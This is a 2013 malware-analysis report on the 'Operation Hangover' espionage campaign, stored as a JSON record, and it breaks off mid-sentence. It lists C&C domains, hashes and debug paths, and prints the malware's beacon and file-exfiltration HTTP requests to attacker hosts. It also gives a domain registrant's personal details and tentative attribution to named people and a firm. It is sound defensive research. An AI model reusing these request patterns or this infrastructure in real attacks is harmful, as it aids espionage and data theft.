{
    "id": "53e9735f-28c2-4ecc-bbc9-8e7414391e9e",
    "created_at": "2022-10-25T16:48:23.383992Z",
    "updated_at": "2025-03-27T02:15:06.207689Z",
    "deleted_at": null,
    "sha1_hash": "aae01ca44ca11f33692bcfd9a20e36105ddfa2b9",
    "title": "Operation Hangover - Unveiling An Indian Cyberattack Infrastructure",
    "authors": "Norman, Shadowserver",
    "file_creation_date": "2013-08-08T13:22:52Z",
    "file_modification_date": "2013-08-15T16:35:25Z",
    "file_size": 1433308,
    "plain_text": "# Unveiling an Indian Cyberattack Infrastructure\n\n### May 2013\n\n\nSnorre Fagerland, Morten Kråkvik, and Jonathan Camp\nNorman Shark AS\n\nNed Moran\nShadowserver Foundation\n\n\n_Part of a PDF decoy from one of the malicious installers (md5 06e80767048f3edefc2dea301924346c). OPERATION HANGOVER_\n\n\n-----\n\n## Executive summary\n\nIn this report we detail a cyberattack infrastructure that appears to be Indian in origin. This infrastructure\nhas been in operation for at least three years, more likely close to four years.\n\nThe purpose of this framework seems predominantly to be a platform for surveillance against targets of\nnational security interest (such as Pakistan), but we will also show how it has been used for industrial\nespionage against the Norwegian telecom corporation Telenor and other civilian corporations.\n\n_The name, “Operation Hangover”, was derived from the name of one of the most frequently used malwares. The project debug_\n_path is often visible inside executable files belonging to this family._\n\n#### None of the information contained in the following report is intended to implicate any individual or entity, or suggest inappropriate activity by any individual or entity mentioned.\n\n\n-----\n\n## Background\n\nOn Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the\ntelecommunications giant Telenor had filed a case with Norwegian criminal police (“KRIPOS”) over what\nwas perceived as an unlawful intrusion into their computer network. The infection was reported to have\nbeen conducted via “spear phishing” emails sent to people in the upper tiers of management.\n\nInitially, we had no information or visibility into this case. However, after some time Norwegian CERT\n(NorCERT) shared some data from the event, which included md5 hashes of malicious files and\ninformation about which Command and Control servers were used.\n\nHowever, the data we were given acted as a starting point for more data mining, and within a short\nperiod of time it became obvious that we were seeing a previously unknown and very extensive\ninfrastructure for targeted attacks. This paper is the result of the ensuing investigation.\n\n## Timeframe\n\nThe samples we have uncovered seem to have been created from approximately September 2010 until\nthe present day. It appears 2012 was a very active year for this group, which saw escalation not only in\nnumbers of created malware files but also in targets. There is no sign that the attacks will slow down in\n2013, as we see new attacks continuously.\n\n## Acknowledgments\n\nWe would like to thank NorCERT, the Norwegian National Security Authority, Telenor and Telenor SOC\nfor their assistance and cooperation during the investigation of this case. We would also like to thank\nESET for graciously sharing information they were in possession of, and finally we would like to express\nour gratitude to the people who created our database and analysis systems. These systems enable us to\ndo the data correlation needed to find needles in haystacks, so their creators own a large part of this\npaper as well.\n\n\n-----\n\n## Terms used\n\n**C&C, C2, CC:** Command- and Control server. Typically used about the computer the malware connects\nto in order to report status.\n\n**Drop:** The online location where malware delivers stolen information.\n\n**FUD:** One meaning of this acronym is “Fear, Uncertainty and Doubt”, but in the malware\nunderground FUD means Fully UnDetectable, i.e. the program is not detected by antivirus tools.\n\n**MD5:** A so-called hash – i.e. a number calculated on the basis of data that identifies these with\nhigh confidence. MD5’s in this paper are used to identify files.\n\n**RTF:** Rich Text Format, a document format\n\n**SFX:** Self-extracting. Executable programs that are also archives, and which extract and\nsometimes execute the archive content when run.\n\n**Sinkholing:** A technique of re-registering a domain that has previously been used for malicious\npurposes. By doing this, machines that are still infected connect to our computer instead of the\nattacker’s, and we can log the connection attempts.\n\n**Spear phishing: To send emails with malicious content (attachments, links, or fraudulent messages) to**\nspecific persons of particular interest.\n\n**Zero day exploits: Program code to attack software vulnerabilities for which there is no patch.**\n\n\n-----\n\n## Telenor intrusion\n\nInitially we had no knowledge of the malware samples involved in the attack on Telenor. However, some\ndays after the attack we received MD5 hashes of the samples used. We only found two of these samples\nin our own datasets, but we later directly received copies of most other samples connected with the case\n(Appendix A).\n\nThe initial spear phishing mail contained two files as attachments – a document named “220113.doc”,\nand an executable file “few important operational documents.doc.exe”.\n(MD5 bd52237db47ba7515b2b7220ca64704e).\n\nThis was a selfextracting (SFX) ZIP archive that contained two files, as shown below.\n\nWhen run, the installer will execute the included “conhosts.exe” file and open the decoy document\n“legal operations.doc”. “legal operations.doc”and “220113.doc” also included in the mail are identical\nsave for their size, and are actually specially crafted RTF files designed to trigger a software vulnerability\n(CVE-2012-0158) in Microsoft Common Controls, typically triggered in Microsoft Word. If the\nvulnerability is triggered, embedded code in the document will be run. This code is encrypted, but after\ndecryption its real purpose becomes visible:\n\n_The file “windwn.exe” is downloaded and executed by this mechanism._\n\n\n-----\n\n_Fig. The behaviour of windwn.exe in Norman Malware Analyzer G2. The persistence mechanism, VBScript execution and data_\n_exfiltration is enough to trigger alerts._\n\nThe files conhosts.exe (MD5 02d6519b0330a34b72290845e7ed16ab) and windwn.exe (MD5\nbfd2529e09932ac6ca18c3aaff55bd79) are both minimally obfuscated Visual Basic executables. They\nconnect to the Command and Control server wreckmove.org (188.240.47.145) via HTTP on port 80, using\na peculiar and recognizable pattern:\n```\nGET\n/flaws/snwd.php?tp=1&tg=[ID]&tv=Error[]&ts=[PLATFORM]&mt=[account]&tr=[NoFiles]&Y1Y5F2 \nHTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR\n2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: wreckmove.org\nConnection: Keep-Alive\n\n```\nOther samples found connected to the case were Delphi information stealers (some highly targeted,\ndown to individual username), file splitter tools, C++ information stealers (keyloggers, screen grabbers\nand file harvesters), and various other malware written in Visual Basic.\n\nThe following C&C domains/IP addresses were observed used in the attack:\n\n\n-----\n\nwreckmove.org\ninfocardiology.biz\nenlighten-energy.org\nresearcherzone.net\n151.237.188.167\ngadgetscorner.org\n\n### Telenor epilogue\n\nOn the 3[rd] of April the attackers created another attack package and placed it on the URL\n_http://mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz/_\n_01084204_Telenor_New_Satellite_Client_Agreement_30032013.zip._\n\nThe package is quite similar to the first, though the decoy document is this time a Powerpoint\npresentation, “01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt”. This is an\napparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation.\nThe included trojan downloader connects this time back to the domain torqspot.org.\n\nThe attackers also created the subdomain\n_internet-security-suite-review.toptenreviews.com.infocardiology.biz, a spoof of the real_\ntoptenreviews.com site. On this site there’s what appears to be an installer for the Bitdefender antivirus\nproduct (bitdefender_tsecurity.zip, md5 62b702a15a762692eda296b0aea270f9), but the zip file contains\nboth a real installer and a Visual Basic trojan identical to the one used against Telenor.\n\nThe Telenor-related attack seems not to be over.\n\n\n-----\n\n## Case expansion through related files\n\nThe behaviour pattern and the file structure of known files made it possible to search internal and public\ndatabases for similar cases. The large amount of new malware being created makes it infeasible to\nconduct malware-related investigations of any scale without strong database support. In our case, we\npreserve the behavioural information of all files processed by our internal bank of Norman MAG2\nautomatic analysis systems.\n\n_Searching internal databases for behavioural similarities: In this case, the particular VB script execution, but there’s a wealth of_\n_attributes we can cluster by._\n\nThere are also several public and commercial databases available for additional data mining, and Google\nis invaluable. The amount of malware we found through this was surprisingly large, and it became clear\nthat the Telenor intrusion was not a single attack but part of a continuous effort to attack and\ncompromise governments and corporations around the world.\n\n\n-----\n\nWhile investigating the extra cases we identified, we accidentally discovered that a number of their C&C\nservers contained world readable folders. We were able to navigate into these and secure the data\nstored there.\n\nThe data contained in these folders were mainly connection logs, keylogs and other uploaded data from\ncomputers affected with malware. Many of the collected logs were from automated analysis systems\nbelonging to security companies, but not all.\n\nAn important find we did on these servers were additional malicious executables, probably meant to be\nserved to infected users. Some of these executables were digitally signed with a certificate which was\nrevoked in 2011:\n\n\n**Technical and Commercial Consulting Pvt. Ltd.**\nVeriSign Class 3 Code Signing 2010 CA\nSerial number: 4bf1d68e926e2dd8966008c44f95ea1c\nRevoked Nov 24[th] 2011\n\n\n-----\n\nSearching our certificate databases we found a large number of other executables similarly signed, none\nof which were found to be innocent applications.\n\n_Certificate database hits_\n\n\n-----\n\n## Case expansion through domain usage and registrations\n\nIn almost all cases, the domains registered by the attackers are “privacy protected”. This means that the\nregistrant has paid the domain registrar to withhold identity information related to the registration. This\nis done almost to perfection. Another feature is that almost all websites belonging to this attacker has\ntheir robots.txt set to “disallow” to stop them from being crawled.\n\nHowever, by searching historical IP data for the IP addresses of domains known to be involved we found\na number of other domains likely belonging to the same infrastructure. These domains were then further\nverified against malware samples to ascertain valid connection to attackers. Some care needs to be taken\nwhen working with IP addresses, as there are possibilities of false correlations on, for example, domain\nparking IP addresses, sinkholes and webhosting servers.\n\n_IP history on researcherzone.net. Source: DomainTools_\n\n```\n.. \ngamezoneall.com. A 173.236.24.254\nkhalistancalling.com.  A 173.236.24.254\nrigidphotography.com.  A 173.236.24.254\nresearcherzone.net. A 173.236.24.254\nf00dlover.info.  A 173.236.24.254\nhotbookspot.info. A 173.236.24.254\nns1.zerodayexploits.org. A 173.236.24.254\n..\n\n```\n\n_A selection of passive DNS data on just one of the known IP addresses which was known to have served malware (1)_\n\n\n-----\n\nAdditional data may be gleaned by querying the IP addresses themselves. Many have set up a default\nESMTP (mail) server on port 587/tcp, which responds with a configured banner. For example, the domain\nonlinestoreapp.net (used by malware MD5 a7b5fce4390629f1756eb25901dbe105) resolved to the IP\naddress 37.59.231.161, and this happens when connecting to that IP on ESMTP:\n\n```\n$ telnet 37.59.231.161 587\nTrying 37.59.231.161...\nConnected to 37.59.231.161.\nEscape character is '^]'.\n220 server.enlighten-energy.org ESMTP Exim 4.80.1 Sat, 23 Mar 2013 16:44:44 -0400\n\n```\n\n_enlighten-energy.org is another of the known bad domains used against Telenor._\n\nAll of this enabled us to draw a domain map over the infrastructure (next page). This map is probably\nlarger than shown here; there might be domains owned by the attackers that are not plotted on this map\nbecause we could not prove they were malicious, and many domains we have not found yet. Conversely,\nmany of the domains plotted were used in attacks years ago and may never be again.\n\n\n-----\n\n_Above: Domain map of the attack infrastructure. Yellow and orange nodes constitute domains, where the_\n_orange have been verified malicious and yellow are likely malicious. Blue nodes are IP addresses, and_\n_purple are autonomous systems (AS). Green nodes are domains that are not part of any attack pattern,_\n_but are interesting in this context. Red nodes show connections to known or likely attacks._\n\n\n-----\n\n## Exploits \n\nWhereas other targeted attack actors often rely extensively on the use of software exploits to plant their\nmalware, this is rarely done by this attack group. As far as we can tell they are only using known\nvulnerabilities; no zero day attacks.\n\n### Documents\n\nThe first exploit we observed was included in the RTF files used in the Telenor attack. The exploit in\nquestion was CVE-2012-0158, a very common vulnerability to exploit.\n\nThe actual document is binary very similar to other documents (51ee31f234db61b488647915f8d7d4c8,\n00978e4b81ac577f328d6add75d0890e, 17a31d1075ebce41ba48a9efacb79d28...) which have been\nused in other targeted attacks by these threat actors.\n\nThe shellcode contains a date check, which means it will stop working after a certain date. In the\nTelenor case, the date was February 16[th] 2013, and in the most recent variations the timeout date is set\nto May 21[nd] 2013. If the exploit is triggered before the timeout date the shellcode does two different\nthings:\n\n  - Posts system info (machinename, timezone, ID, running processes) to a PHP script residing on\nthe website random123.site11.com.\n\n  - Downloads and executes an executable from remote sites. We have seen softmini.net,\n_www.infocardiology.biz, www.getmedia.us, www.technopenta.org, and autowidge.org used for_\nthis.\n\n  - The executables downloaded have usually themselves been downloaders. In a couple of cases\nwe have observed final payload to be Dark Comet, a well-known backdoor trojan, but unusual\nfor this group to use.\n\n### Web\n\nWhen we investigated the attacker domain structure we found more exploit code. This time it was\nimplemented as a script in the main web page of the domain you-post.net. The exploit is this time CVE2012-4792, an Internet Explorer vulnerability. When it triggers it downloads and runs a malicious\nexecutable from the domain softmini.net; also the domain used by two of the three documents\nmentioned above.\n\nSoftmini.net seems to be a hub for exploitcode; its subdomain get.adobe.flash.softmini.net contains an\nactive Java exploit (CVE-2012-0422) which attempts to install the same trojan as the IE exploit above.\n\n\n-----\n\n## The Smackdown downloaders\n\nMost of the first stage malware we’ve seen used in attacks are variants of Smackdown, a large family of\nVisual Basic downloaders which for the most part seem to be written by a person calling himself “Yash”\nor “Yashu”. These have evolved over time and are using different levels of obfuscation on text strings.\nTypically the trojan begins by uploading system information to a PHP script on the C&C server. The\nattacker can decide separately which infected machine should receive additional malware. The second\nstage malware is usually Hanove but other malware families are also used.\n\n_Different text obfuscations in a Smackdown “miNaPro” downloader. Reversed strings, character code encoding and inserting_\n_garbage ‘%’ characters._\n\n\n-----\n\n## The HangOver malware, aka Hanove\n\nThe second stage malware are often variants of HangOver, information stealers written in C++. They\nappear to be written over a common framework as many internal functions are identical, but overall\nfunctionality can vary quite a bit from one subtype to another. The first versions of these may have been\nbased on code from an innocent backup utility as the word “backup” is often present.\n\n_Hanove Uploaders recursively scan folders looking for files to upload. What kind of files they look for are_\nusually defined in resources as an extension list, and these lists vary. Here are a few examples:\n\n\n*.doc;*.xlxs;*.docx;*.rtf\n*.doc;*.xlxs;*.docx;*.rtf;*.jpg;*.ppt;*.pps;*.pdf;*.xlx\n*.doc;*.xlsx;*.docx;*.rtf;*.pdf;*.xls;*.ppt;*.txt;*.inp;*.kmz;*.pps;*.uti\n\n\n_Hanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file._\nSome variants capture other data as well, such as clipboard content, screenshots, titles of open windows\nand content of browser edit fields. Timed events are set up to upload the data to the remote server.\n\nThe stolen data are uploaded to remote servers by FTP or HTTP.\n\nA typical HTTP request looks like this:\n\n\nPOST /up.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=F39D45E70395ABFB8D8D2BFFC8BBD152\nUser-Agent: EMSFRTCBVD\nHost: remotedomain.com\nContent-Length: 5050\nCache-Control: no-cache\n\n--F39D45E70395ABFB8D8D2BFFC8BBD152\nContent-Disposition: form-data; name=\"uploaddir\"\nsubfolder/%username-machinename%/C/\n\n--F39D45E70395ABFB8D8D2BFFC8BBD152\n\n\n-----\n\nUserAgent strings vary between versions. The following have been seen in connection with this family:\n\n\nEMSCBVDFRT, EMSFRTCBVD, FMBVDFRESCT, DSMBVCTFRE, MBESCVDFRT, MBVDFRESCT\nTCBFRVDEMS, DEMOMAKE, DEMO, UPHTTP, sendFile\n\n\nBoundary parameters vary between versions. The following have been seen in connection with this\nfamily:\n\n\nF39D45E70395ABFB8D8D2BFFC8BBD152, 90B452BFFF3F395ABDC878D8BEDBD152\nFFF3F395A90B452BB8BEDC878DDBD152, 5A9DCB8FFF3F02B8B45BE39D152\n5A902B8B45BEDCB8FFF3F39D152, 78DDB5A902BB8FFF3F398B45BEDCD152\n2BB8FFF3F39878DDB5A90B45BEDCD152, 905ABEB452BFFFBDC878D83F39DBD152\nD2BFFC8BBD152F3B8D89D45E70395ABF, 8765F3F395A90B452BB8BEDC878\n90ABDC878D8BEDBB452BFFF3F395D152, F12BDC94490B452AA8AEDC878DCBD187\n\n\nString content consists of some strings largely static between variants, and some that vary. Non-static\nstrings are browser UserAgent strings, MIME boundary tags, mutexes, domain names, paths, and registry\nkeys, which also may be obfuscated by being fragmented. Many Hanove variants use a simple rotating\nencoding scheme to hide the interesting strings. For example, the domain “wearwellgarments.eu” is\nhidden as “xfbsxfmmhbsnfout/fv” and the word “php” becomes “qiq”.\n\nDifferent variants are frequently given internal names, visible through debug paths included in the\nbinary. Such internal names used include “HangOver”, “Ron”, ”Dragonball”, ”Tourist”, ”Klogger”,\n“FirstBlood” and “Babylon”.\n\nThere are several other malwares and tools in use. See appendix C for more indicators.\n\n\n-----\n\n## Target selection\n\nWe have direct knowledge of only one attack – the one against Telenor. During this investigation we\nhave obtained malware samples and decoy documents that have provided indications as to whom else\nwould be in the target groups. We have observed the usage of peculiar domain names that are\nremarkably similar to existing legitimate domains. We have also obtained sinkhole data for a number of\ndomains in question and found open folders with stolen userdata in them; enough to identify targets\ndown to IP and machine name/domain level. This showed a geographical distribution where Pakistan\nwas the most affected in volume, but also showed a multitude of other countries being represented.\n\nPK\n\nIR\n\n13 [8 7 6 6 5 4 4 4 4 3 3 3 2 2 2 2 2 1 1 1 1 1 1 1 1 1 1 1 1 1 1 ] US\n\n14\n\nTW\n\n24\n\nSG\n\n28\n\nIN\n\nCN\n\n34\n\nOM\n\nRU\n\nCA\n\n91 PA\n511\n\nTH\n\nDE\n\nFR\n\nJO\n\nPL\n\nNote that these data should be taken as indicative only. IP counts are misleading for many reasons. One\nmachine can generate many IP addresses, and some IP addresses are probably lab machines. However,\nthe indication that Pakistan is the most prevalent target seems solid.\n\nIn the following pages we’ve highlighted some of the files we have seen used to attack organizations in\ndifferent countries. As can be seen from the examples the attackers have gone to great lengths to make\nthe social engineering aspect as credible and applicable as possible.\n\n\nPK\n\nIR\n\n13 [8 7 6 6 5 4 4 4 4 3 3 3 2 2 2 2 2 1 1 1 1 1 1 1 1 1 1 1 1 1 1 ] US\n\n14\n\nTW\n\n24\n\nSG\n\n28\n\nIN\n\nCN\n\n34\n\nOM\n\nRU\n\nCA\n\n91 PA\n511\n\nTH\n\nDE\n\nFR\n\nJO\n\nPL\n\n\n-----\n\n### Pakistan\n\nThe most obvious target seems to be Pakistan. As is visible above, computers in Pakistan are by far the\nmost active in connecting to malicious domains.\n\nWe found logs in the open drop folders that contained suggestive data, such as this snippet from a 2012\nlog entry (subdomain redacted):\n\n\nHost Name: PC-PS2CHAIRMAN\nRegistered Owner:     admin\nTime Zone: (GMT+05:00) Islamabad, Karachi\nDomain: ****.gov.pk\n\n\nSinkhole-logged HTTP requests are also informative, such as this seemingly from a Pakistani embassy:\n“GET /sdata/shopx.php?fol=EMBASSYOFPAKIST-Embassy%20of%20Pakistan.....”\n\nDecoy files tailored towards Pakistan revolve around the ongoing conflicts in the region, regional culture\nand religious matters.\n\n_Pakistani soldiers praying in Karakoram. Apparent source:_\n_http://photography.nationalgeographic.com/photography/enlarge/praying-soldiers_pod_image.html_\n\n\n-----\n\n_Google images of the Mendhar region in India. There was a border clash there recently._\n_http://jammu.greaterkashmir.com/news/2013/Jan/12/mendhar-incident-creates-panic-among-border-residents-29.asp_\n\n_A review of Indian future weapon acquisitions.It seems to be sourced from defence.pk_\n\nAdditional examples can be found in Appendix B.\n\n\n-----\n\n### China\n\nChina is another country which apparently has been targeted to some extent.\n\nFor example, we found a data dump and keylog seemingly harvested from a computer belonging to a\nChinese academic institution. This dump was generated in July 2012 and contains Word documents,\nPowerPoint presentations and images.\n\n_Uploaded archives of harvested data._\n\nDecoys are also present, but not in the amount as is seen against Pakistani targets.\n\n_Chinese decoy, a scanned document named court_order.jpg. This is a notification to the family of a criminal about his jail_\n_sentence. Language is simplified Chinese; likely mainland China._\n\n\n-----\n\n### The Khalistan movement\n\nThis is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab\nin India. Violent episodes between supporters of the Khalistan movement and government forces have\noccurred through history since the movement’s creation in 1971.\n\nExamples of malware apparently aimed at the movement are md5’s\na4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa. The former appears\nto be this file: http://f00dlover.info/Khalistan/Victims_want_Sajjan_Kumar_punished.doc.zip\n\nIt is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with\nmany other domains belonging to this infrastructure – for example the domain researcherzone.net\nwhich was used in the Telenor intrusion. There are also a number of domains with active web pages\nthat used to exist on this IP; for example khalistancalling.com. Khalistancalling.com has since moved on\nto another bad IP (46.182.104.83) and must be considered owned by the attackers.\n\n\n-----\n\n### The Nagaland movement\n\nThe Nagaland (or Nagalim) movement is another secessionist group aiming to create a sovereign\nhomeland for the Naga people living in North-Eastern India and North-Western Burma. We have seen at\nleast two attacks apparently aimed at them.\n\nA sample from 2010, md5 168f2c46e15c9ce0ba6e698a34a6769e, showed a scanned document which\nappears to be a letter from the “President of Nagalim”.\n\nThe malware sample also installed an executable which in turn connected back to the domain\n_zeusagency.org on the IP 176.31.65.124. Zeusagency.org has hosted different malware; one_\n(3105b020e2bd43924404bc4e3940191b) connected to fistoffury.net on the IP 176.31.65.126.\n\nThe IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo\nmalwares. These are somewhat different from the standard Hanove series, though functionality is\nroughly equivalent.\n\n\n-----\n\nAnother malicious installer (md5 f1799d11b34685aa209171b0a4b89d06) contained the following decoy:\n\nThe malware included connects to the domain global-blog.net.\n\n\n-----\n\n### Industrial espionage\n\nWhile the Telenor case was most likely industrial espionage, we were initially unaware of other “nonstrategic/political” targets by this attack group, but during our research we discovered several related\nattack files that were clearly targeting businesses. As can be seen in the example below, the social\nengineering aspects are more related to business content. We want to emphasize that except in the case\nof BUMI PLC, we have no information to suggest that any of the organizations named in the following\npages have been compromised. However, the available information strongly indicates that they were\ntargets of interests for the attackers.\n\n**Likely target: Eurasian Natural Resources Corporation (ENRC)**\n\nThis company which is headquartered in London has operations in multiple countries, notably in\nKazakhstan. The following malwares appear to be aimed at ENRC.\n\nENRC__DEBT__INVESTORS__2012__for__your__Reference.exe\n(MD5 e40205cba4e84a47b7c7419ab6d77322)\nDeatils_for_the_ENRC_Board_Meeting_X1098977e79.exe\n(MD5 a5a740ce2f47eada46b5cae5facfe848)\nDetails_for_the_ENRC_Board_Meeting_X10FR333_2012.exe\n(MD5 2895a9b0cf22cd45421d634dc0f68db1)\nDetail_description_of_ferro_chrome_silicon_and_ferro_chrome.exe\n(MD5 2102a18dc20dc6654c03e0e74f36033f)\nGerhard_Ammann_Article_Content_From_Wikipedia.exe\n(MD5 d96aa87c25c9c491bee97aad65bafc9e)\n\n_Gerhard Ammann is also affiliated with ENRC._\n\n\n-----\n\n**Known target: Bumi PLC, Indonesia**\n\nWhen searching for known instances of domains belonging to the attack infrastructure, we found a\npublished incident report made by Context Information Security (2). This report details how the\nChairman of Bumi PLC, Mr Samin Tan, had been exposed to a spear-phishing attack in July 2012. Bumi is\nan international mining group listed on the London Stock Exchange.\n\n_Source: Context Information Security._\n\nBoth the domains mentioned in this report have been connected to the attack group investigated. For\nexample, the malware executable “dua2alhycox12.exe” (c94267ba9c92f241379cdceed58777dc)\nconnects to hycoxcable.com, which anoniemvolmacht.com historically acted as name server for. The\nlatter domain has also shared IP with the malicious domain chronicleserv.org.\n\n\n-----\n\n**Likely target: Porsche Informatik**\n\nA malware using the name “webmailapp.exe” (22a3a1d5a89866a81152cd2fc98cd6e2) is a self-extracting\narchive containing several files, among them a batch file opening a shortened URL pointing to Porsche\nHolding’s webmail front in Austria.\n\nTarget must be assumed to be persons affiliated with Porsche. Again, we have no information as to\nwhether any intrusion has occurred.\n\n_The webmail front of Porsche in Austria._\n\n\n-----\n\n**Possible target: Restaurant industry**\n\nIt appears unlikely that the restaurant and food industry should be the victim of targeted attacks.\nHowever, that’s how it appears. One indicator is the decoy file below, taken from the malicious\nexecutable “Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe“\n(f52154ae1366ae889d0783730040ea85).\n\n_Guardian article about a horsemeat scandal in Ireland. Target is unknown, but file was first submitted to the VirusTotal scan_\n_service from Great Britain._\n\nAnother indicator is the use of certain domain names, like the malicious bluebird_restaurant.co.uk.infocardiology.biz_ vs the legitimate bluebird-restaurant.co.uk.\nThe latter is a restaurant in Chelsea, UK.\n\n\n-----\n\n**Likely target: Chicago Mercantile Exchange**\n\nWhile investigating the malicious domain web-mail-services.info, we found a number of other domains\nthat had shared the IP address 188.95.48.99 with it. One of these domains was cmegroups.net, a spoof\nof cmegroup.com; the domain belonging to Chicago Mercantile Exchange. CME is the world's largest\nfutures exchange company (3).\n\nAn entry on WIPO (4), the UN arbitration body for domain name disputes, shows that a complaint\nregarding this domain name was leveled by CME against PrivacyProtect.org in 2012. The complaint was\nnot disputed, and domain transferred to CME. However, the most interesting information is found in the\ncase details.\n\n_Source:wipo.net_\n\nAn interesting question is of course whether there were any attachments to this mail.\n\n\n-----\n\nOther suggestive domain names that have been used include:\n\n_server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de:_\nThe latter is the mail server for several German businesses, for example restaurants.\n_www.alintiqad-newsonline.blogspot.com.continuelogs.info_ vs www.alintiqad.com:\nThe latter is a Lebanese newspaper in Arabic.\n_account.istpumpenunddosiertechnik.de.continuelogs.info_ vs istpumpenunddosiertechnik.de:\nThe latter is a German producer of pumps for high-viscosity fluids.\n_deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org_ vs _deltaairlines.com:_\nDelta Airlines.\n_mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs_\n_mail.telenor.no: Telenor_\n_lynberrg.com vs lynberg.com: The latter belongs to Lynberg & Watkins, a US-based law firm._\n_mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs_\n_mail.carmel.us: The latter is the webmail address of Carmel&Carmel, a US-based law firm._\n_armordesigns.com.webmail-login.php.web-mail-services.info_ vs armordesigns.com:\nThe latter is a US-based manufacturer of composite materials for armor:\n\nWe do not know (yet) what purpose all these domains have, but it’s hard to imagine that the name\nspoofing is done by anything but malicious intent; it is a common tactic in targeted attacks.\n\n\n-----\n\n## Attribution\n\nThe continued targeting of Pakistani interests and origins suggested that the attacker was of Indian\norigin.\n\n**Project and debug paths**\n\nCuriously, many of the executables we uncovered from related cases contained cleartext project and\ndebug path strings (see Appendix D for full list). It is not very common to find malware with debug paths,\nbut these particular threat actors did not seem to mind leaving such telltale signs, or maybe they were\nunaware of their presence. These paths gave more indicators that the attackers were Indian. First, many\nof the Visual Basic keyloggers contained the name “Yash”, which might be an abbreviation for several\nIndian names. The trojans used against Telenor did not contain any such person name, but the Visual\nBasic project name is clearly related to others:\n\nTelenor case (02d6519b0330a34b72290845e7ed16ab, bfd2529e09932ac6ca18c3aaff55bd79)\n“C:\\miNaPro.vbp”\n\nRelated cases (4ad80ff251e92004f56bb1b531175a49, 3d6a8b2df08443c2aa4b6a07a9b55b16)\n“D:\\YASH\\PRO\\MY\\DELIVERED\\2012\\DOWNLOADERS\\compiled\\NewSmack(sep2012)\\miNaPro.vbp”\n\nThis similarity is not coincidental; these trojans are based on the same code and exhibit similar\nbehaviour.\n\nThis and other text strings we initially saw gave further hints towards Indian attackers.\n\n\nR:\\payloads\\ita nagar\\Uploader\\HangOver 1.5.7 (Startup)\\HangOver 1.5.7 (Startup)\\Release\\Http_t.pdb\nC:\\Users\\neeru rana\\Desktop\\Klogger- 30 may\\Klogger- 30 may\\Release\\Klogger.pdb\nC:\\Users\\Yash\\Desktop\\New folder\\HangOver 1.5.7 (Startup) uploader\\Release\\Http_t.pdb\n\n\n-----\n\n**A managed environment**\n\nThe project paths also give a rare glimpse into something we almost never see – a managed malware\ncreation environment, where multiple developers are tasked with specific malware deliverances.\n\nThis is visible in the way the projects themselves are organized:\n\n...Desktop\\Feb 2012\\kmail(httpform1.1) ...\n...May Payload\\new keylogger\\Flashdance1.0.2\\...\n...\\Monthly Task\\August 2011\\USB Prop\\...\n...\\Sept 2012\\Keylogger\\Release\\...\n...\\June mac paylods\\final Klogger-1 june-Fud from eset5.0\\Klogger- 30 may\\...\n...ner\\Task\\HangOver 1.2.2\\Release...\n...\\august\\13 aug\\HangOver 1.5.7 (Startup) uploader\\...\n...\\task information\\task of september\\Tourist 2.4.3...\n...\\final project backup\\complete task of ad downloader & usb grabber&uploader\\...\n..D:\\YASH\\PRO\\MY\\DELIVERED\\2012\\DOWNLOADERS\\compiled\\..\n\nThere are many diverging project paths which points towards different persons working on separate\nsubprojects, but apparently not using a centralized source control system. The projects seem to be\ndelegated into tasks, of which some seem to follow a monthly cycle. There are hints at team structures,\nlike the string “VB Team Matrix Production” found in a sample (fa6d2483f766f8431b6c0a8c78178d48),\nan indication that a separate team works with Visual Basic development. Some series of malware contain\nstrings like “delivered”, which, together with the loose project structures may indicate that development\nwork is being outsourced.\n\n\n-----\n\n**The word “Appin”.**\n\nIn a great number of isolated cases and contexts, the word “Appin” shows up and there seems to be\nsome connection with the Indian security company called Appin Security Group. By this, we are not\nimplicating or suggesting inappropriate activity by Appin. Maybe someone has tried to hurt Appin by\nfalsifying evidence to implicate them. Maybe some rogue agent within Appin Security Group is involved,\nor maybe there are other explanations. Getting to the bottom of that is beyond our visibility.\n\nFor example, the strings “Appin”, “AppinSecurityGroup”, and “Matrix” are frequently found inside\nexecutables.\n\nOne example of this peculiarity is debug paths inside malware files:\n\n\nC:\\BNaga\\backup_28_09_2010\\threads tut\\pen-backup\\BB_FUD_23\\Copy of client\\ Copy of\nclient\\appinbot_1.2_120308\\Build\\Win32\\Release\\appinclient.pdb\n\nC:\\BNaga\\kaam\\Appin SOFWARES\\RON 2.0.0\\Release\\Ron.pdb\n\nC:\\BNaga\\SCode\\BOT\\MATRIX_1.2.2.0\\appinbot_1.2_120308\\Build\\Win32\\Release\\deleter.pdb\n\nC:\\Documents and Settings\\Administrator\\Desktop\\Backup\\17_8_2011\\MATRIX_1.3.4\\CLIENT\\\nBuild\\Win32\\Release\\appinclient.pdb\n\nD:\\Projects\\Elance\\AppInSecurityGroup\\FtpBackup\\Release\\Backup.pdb\n\n\nOne should note that anyone can add or change such text strings.\n\n\n-----\n\n**Domain registrations**\n\nAs mentioned, the privacy-protection of domain registrations is almost perfect, but only almost. There\nare a large number of domains used, and a few of these have been suspended and lost their privacy\nprotection. For example, the following malicious domains all used the same registration information\n```\nNITR0RAC3.COM, VALL3Y.COM, S3RV1C3S.NET, GAUZPIE.COM, BLUECREAMS.COM:\nRegistrant:\n  NA\n  Prakash    (mail@gmail.com)\n  Jain\n  TY-76, Kohat Enclave\n  Delhi\n  Delhi,110034\n  IN\n  Tel. +011.9873456756\n\n```\nIdentical 